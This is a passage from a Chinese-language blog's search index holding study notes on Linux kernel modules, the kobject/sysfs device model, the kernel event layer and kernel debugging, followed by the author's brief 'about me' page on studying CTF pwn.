class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="comment">//MODULE_LICENSE("GPL");</span></span><br><span class="line"><span class="comment">//MODULE_AUTHOR("nuoye");</span></span><br><span class="line"><span class="comment">//MODULE_DESCRIPTION("A hello world moudle");</span></span><br></pre></td></tr></table></figure>

<h4 id="构建模块"><a href="#构建模块" class="headerlink" title="构建模块"></a>构建模块</h4><p>构建过程的第一步是决定在哪里管理模块源码。可以把模块源码加入到内核源代码树中，或者是作为一个补丁或者是最终把代码合并到正式的内核代码树中；；另一种可行的方式是在内核源代码树之外维护和构建模块源代码。</p>
<h5 id="放在内核源代码树中"><a href="#放在内核源代码树中" class="headerlink" title="放在内核源代码树中"></a>放在内核源代码树中</h5><p>设备驱动程序存放在内核源码树根目录下/drivers的子目录下，在其内部，设备驱动文件被进一步按照类别、类型或特殊驱动程序等更有序地组织起来。</p>
<h5 id="放在内核代码外"><a href="#放在内核代码外" class="headerlink" title="放在内核代码外"></a>放在内核代码外</h5><p>需要在自己的源代码树目录中建立一个Makefile文件，并加入一行指令（假设源代码文件为fishing.c）：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := fishing.o</span><br></pre></td></tr></table></figure>

<p>假如有多个文件（如fishing-main.c和fishing-line.c）：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := fishing.o</span><br><span class="line">fishing-objs := fishing-main.o fishing-line.o</span><br></pre></td></tr></table></figure>

<p>然后就运行以下命令编译模块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make -C /kernel/<span class="built_in">source</span>/location SUBDIRS=<span class="variable">$PWD</span> modules</span><br></pre></td></tr></table></figure>

<p>其中/kernel/source/location是内核源代码树。</p>
<h4 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h4><p>编译后的模块将被装入到目录/lib/modules/version/kernel/下，可以用下面的构造命令来安装编译的模块到合适的目录下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make module_install</span><br></pre></td></tr></table></figure>

<h4 id="产生模块依赖性"><a href="#产生模块依赖性" class="headerlink" title="产生模块依赖性"></a>产生模块依赖性</h4><p>模块依赖关系信息存放在/lib/modules/version/modules.dep中。</p>
<h4 id="载入模块"><a href="#载入模块" class="headerlink" title="载入模块"></a>载入模块</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod module.ko</span><br></pre></td></tr></table></figure>

<h4 id="卸载模块"><a href="#卸载模块" class="headerlink" title="卸载模块"></a>卸载模块</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rmmod module</span><br></pre></td></tr></table></figure>

<h4 id="管理配置选项"><a href="#管理配置选项" class="headerlink" title="管理配置选项"></a>管理配置选项</h4><h4 id="模块参数"><a href="#模块参数" class="headerlink" title="模块参数"></a>模块参数</h4><p>Linux允许驱动程序声明参数，从而用户可以在系统启动或者模块装载时再指定参数值，这些参数对于驱动程序属于全局变量。模块参数同时也将出现在sysfs文件系统中。</p>
<h4 id="导出符号表"><a href="#导出符号表" class="headerlink" title="导出符号表"></a>导出符号表</h4><p>模块被载入后，就会被动态连接到内核。导出的内核函数可以被模块调用，而未导出的函数模块则无法被调用。</p>
<h3 id="设备模型"><a href="#设备模型" class="headerlink" title="设备模型"></a>设备模型</h3><p>2.6内核新增了统一设备模型。设备模型提供了一个独立的机制专门来标识设备，并描述其在系统中的拓扑结构。</p>
<h5 id="kobject"><a href="#kobject" class="headerlink" title="kobject"></a>kobject</h5><p>设备模块的核心部分就是kobject，它由struct kobject结构体表示，定义于&lt;linux/kobject.h&gt;中。</p>
<p>kobject通常是嵌入其他结构中的，当kobject被嵌入到其他结构中时，该结构便拥有了kobject提供的标准功能，并且，嵌入kobject的结构体可以成为对象层次架构中的一部分。</p>
<h4 id="ktype"><a href="#ktype" class="headerlink" title="ktype"></a>ktype</h4><p>kobject对象呗关联到一种特殊的类型：ktype，由kobj_type结构体表示，定义于&lt;linux/kobject.h&gt;中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> (*<span class="built_in">release</span>)(struct kobject *kobj);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysfs_ops</span> *<span class="title">sysfs_ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> **<span class="title">default_attrs</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ktype的存在是为了描述一族kobject所具有的普遍特性。</p>
<p>release指针指向在kobject引用计数减至零时要被调用的析构函数，该函数负责释放所以kobject使用的内存和其他相关清理工作。</p>
<p>sysfs_ops变量指向sysfs_ops结构体，该结构体描述了sysfs文件读写时的特性。</p>
<p>最后，default_attrs指向一个attribute结构体数组。这些结构体定义了该kobject相关的默认属性。</p>
<h4 id="kset"><a href="#kset" class="headerlink" title="kset"></a>kset</h4><p>kset是kobject对象的集合体。</p>
<p>具有相同的ktype的kobject可以被分组到不同的kset。</p>
<p>kobjsect中的kset指针指向kset集合。kset集合由kset结构体表示，定义于&lt;linux/kobject.h&gt;中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset_uevent_ops</span> *<span class="title">uevent_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中list连接该集合中所有的kobject对象。kobj指向的kobject对象代表了该集合的基类。uevent_ops指向一个结构体——用于处理集合中kobject对象的热插拔操作，uevent就是用户事件的缩写，提供了与用户空间热插拔信息进行通信的机制。</p>
<h4 id="管理和操作kobject"><a href="#管理和操作kobject" class="headerlink" title="管理和操作kobject"></a>管理和操作kobject</h4><h4 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h4><p>初始化后，kobject的引用计数设置为1.只要引用计数不为0，那么该对象就会继续保留在内存中，任何包含对象引用的代码首先要增加该对象的引用计数，结束后则减少它的引用计数。</p>
<p>增加引用计数称之为获得对象的引用，减少引用计数称为释放对象的引用。当引用计数跌到零时，对象便可以被撤销，同时相关内存也都被释放。</p>
<h3 id="sysfs"><a href="#sysfs" class="headerlink" title="sysfs"></a>sysfs</h3><p>sysfs文件系统是一个处于内存中的虚拟文件系统，它提供了kobject对象层次结构的视图。</p>
<p>sysfs文件系统挂载在sys目录下。</p>
<p>block目录下的每个子目录都对应着系统中的一个已注册的块设备。bus目录提供了一个系统总线视图。class目录包含了以高层逻辑功能组织起来的系统设备视图。dev目录是已注册设备节点的视图。devices目录是系统中设备拓扑结构视图，它直接映射出了内核中设备结构体的组织层次。firmware目录包含了一些诸如ACPI、EDD、EFI等低层子系统的特殊树。fs目录是已注册文件系统的视图。kernel目录包含内核配置项和状态信息，module目录则包含系统已加载模块的信息。power目录包含系统范围的电源管理数据。</p>
<p>其中，devices目录将设备模型导出到用户控件。</p>
<h4 id="sysfs中添加和删除kobject"><a href="#sysfs中添加和删除kobject" class="headerlink" title="sysfs中添加和删除kobject"></a>sysfs中添加和删除kobject</h4><p>函数定义于lib/kobject.c中，声明与&lt;linux/kobject.h&gt;中。</p>
<h4 id="向sysfs中添加文件"><a href="#向sysfs中添加文件" class="headerlink" title="向sysfs中添加文件"></a>向sysfs中添加文件</h4><h5 id="默认属性"><a href="#默认属性" class="headerlink" title="默认属性"></a>默认属性</h5><p>默认的文件集合是通过kobject和kset中的ktype字段提供的。因此所有具有相同类型的kobject在它们对应的sysfs目录下都拥有相同的默认文件集合。kobj_type字段含有一个字段——default_attrs，它是一个attribute结构体数组，定义于&lt;linux/sysfs.h&gt;中。这些属性负责将内核数据映射成sysfs中的文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>		*name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span>		*<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">mode_t</span>			mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中name字段提供了该属性的名称。owner字段在存在所属模块的情况下指向其所属的module结构体；若没有该属性，那么该字段为NULL。mode字段表示了sysfs中该文件的权限。sysfs中的所有文件和目录的uid与gid标志均为零。</p>
<p>default_attrs列出了默认属性，而sysfs_ops字段则描述了如何使用它们。sysfs_ops字段指向了一个定义于文件&lt;linux/sysfs.h&gt;的同名结构体。</p>
<h5 id="创建新属性和删除新属性"><a href="#创建新属性和删除新属性" class="headerlink" title="创建新属性和删除新属性"></a>创建新属性和删除新属性</h5><p>声明在&lt;linux/kobject.h&gt;中。sysfs_create_file()和sysfs_remove_file()定义在fs/sysfs/file.c中。sysfs_create_link()和sysfs_remove_link()定义于fs/sysfs/symlink.c中。</p>
<h5 id="sysfs约定"><a href="#sysfs约定" class="headerlink" title="sysfs约定"></a>sysfs约定</h5><ol>
<li>sysfs属性应该保证每个文件只导出一个值，该值应该是文本形式而且映射为简单C类型。</li>
<li>sysfs中要以一个清晰的层次组织数据。</li>
<li>sysfs提供内核到用户空间的服务。</li>
</ol>
<h3 id="内核事件层"><a href="#内核事件层" class="headerlink" title="内核事件层"></a>内核事件层</h3><p>内核事件层实现了内核到用户的消息通知系统</p>
<p>内核事件把事件模拟为信号——从明确的kobject对象发出，所以每个事件源都是一个sysfs路径。每个事件都被赋予了一个动词或动作字符串表示信号。每个事件都有一个可选的负载。相比传递任意一个表示负载的字符串到用户空间而言，内核事件层使用sysfs属性代表负载。</p>
<p>从内部实现来讲，内核事件由内核空间传递到用户空间需要经过netlink。netlink是一个用于传送网络信息的多点传送套接字。方法就是用户空间实现一个系统后台服务用于监听套接字，处理任何读到的信息，并将事件传送到系统栈里。在内核代码向用户空间发送信号使用kobject_uevent()函数，定义于lib/kobject_uevent.c，声明在&lt;linux/kobject.h&gt;中。</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="printk"><a href="#printk" class="headerlink" title="printk"></a>printk</h3><h4 id="日志等级"><a href="#日志等级" class="headerlink" title="日志等级"></a>日志等级</h4><p>printk可以指定一个日志级别，在&lt;linux/kernel.h&gt;中有简单的宏定义，如KERN_WARING等。</p>
<p>内核用这个指定的记录等级和当终端的记录等级console_loglevel来决定是不是向终端上打印。</p>
<h4 id="记录缓冲区"><a href="#记录缓冲区" class="headerlink" title="记录缓冲区"></a>记录缓冲区</h4><p>内核消息都被保存在一个LOG_BUF_LEN大小的环形队列中。</p>
<h4 id="syslogd和klogd"><a href="#syslogd和klogd" class="headerlink" title="syslogd和klogd"></a>syslogd和klogd</h4><p>在标准的Linux系统上，用户空间的守护进程klogd从记录缓存区中获取内核消息，在通过syslogd守护进程将它们保存在系统日志文件中。klogd程序既可以从/proc/kmsg文件中，也可以从syslog()系统调用中读取这些消息。默认情况下，它选择读取/proc方式实现。不管哪种方式，klogd都会阻塞，知道有新的内核消息可供读出。</p>
<p>syslogd守护进程把它接收到的所有消息添加进一个文件中，该文件默认是/var/log/messages，也可以通过/etc/syslog.conf配置文件重新指定。</p>
<p>在启动klogd的时候，可以通过指定-c标志来改变终端的记录等级。</p>
<h3 id="oops"><a href="#oops" class="headerlink" title="oops"></a>oops</h3><p>oops是内核告知用户有错误发生的最常用方式。</p>
<p>这个过程包括向终端上输出错误消息，输出寄存器中保存的信息并输出可供追踪的回溯线索。通常，发送完oops之后，内核会处于一种不稳定状态。</p>
<h4 id="ksymoops"><a href="#ksymoops" class="headerlink" title="ksymoops"></a>ksymoops</h4><p>命令ksymoops可以将回溯线索中的地址转化成有意义的符号名称。但必须提供编译内核时产生的System.map。</p>
<h4 id="kallsyms"><a href="#kallsyms" class="headerlink" title="kallsyms"></a>kallsyms</h4><h3 id="内核调试配置选项"><a href="#内核调试配置选项" class="headerlink" title="内核调试配置选项"></a>内核调试配置选项</h3><h3 id="引发bug并打印信息"><a href="#引发bug并打印信息" class="headerlink" title="引发bug并打印信息"></a>引发bug并打印信息</h3><h3 id="系统请求键"><a href="#系统请求键" class="headerlink" title="系统请求键"></a>系统请求键</h3><p>内核代码中Documentation/sysrq.txt对此有详细说明，实际的实现在drivers/char/sysrq.c中。</p>
<h3 id="内核调试器"><a href="#内核调试器" class="headerlink" title="内核调试器"></a>内核调试器</h3><h4 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h4><h4 id="kgdb"><a href="#kgdb" class="headerlink" title="kgdb"></a>kgdb</h4><p>该补丁在Documentation/目录下有很多安装说明。</p>
<h3 id="探测系统"><a href="#探测系统" class="headerlink" title="探测系统"></a>探测系统</h3><p>下面介绍几种技巧以修改来进一步探测系统从而得到答案：</p>
<ul>
<li>用UID作为选择条件</li>
<li>使用条件变量</li>
<li>使用统计量</li>
<li>重复频率限制</li>
</ul>
<h2 id="可移植性"><a href="#可移植性" class="headerlink" title="可移植性"></a>可移植性</h2><h3 id="可移植性操作系统"><a href="#可移植性操作系统" class="headerlink" title="可移植性操作系统"></a>可移植性操作系统</h3><h3 id="字长和数据类型"><a href="#字长和数据类型" class="headerlink" title="字长和数据类型"></a>字长和数据类型</h3><h3 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h3><h3 id="字节顺序"><a href="#字节顺序" class="headerlink" title="字节顺序"></a>字节顺序</h3><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><h3 id="页长度"><a href="#页长度" class="headerlink" title="页长度"></a>页长度</h3><h3 id="处理器排序"><a href="#处理器排序" class="headerlink" title="处理器排序"></a>处理器排序</h3><h3 id="SMP、内核抢占、高端内存"><a href="#SMP、内核抢占、高端内存" class="headerlink" title="SMP、内核抢占、高端内存"></a>SMP、内核抢占、高端内存</h3>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>分类</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>关于我</title>
    <url>/about/index.html</url>
    <content><![CDATA[<h1 id="博客内容"><a href="#博客内容" class="headerlink" title="博客内容"></a>博客内容</h1><p>一枚菜鸡的养成，不定时更新各种学习笔记以及wp。</p>
<h1 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h1><p>应化专业的菜鸡。<br>18年前学过一些计算机皮毛，c/c++、计算机网络、sql、web、服务器等都是很早学的，部分已遗忘（不要问我为什么不选计算机专业，问就是当时脑子死机了）。<br>18年9月份正式入坑ctf，主攻pwn方向，当了2年弟弟（大哥们太强了，真的跟不上）。<br>目前大二下学期，考虑到就业问题，准备专攻安卓方向，希望一年的时间赶得上。</p>
<p>联系方式：qq2107832334</p>
]]></content>
  </entry>
  <entry>
    <title>友情链接</title>
    <url>/link/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>标签</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
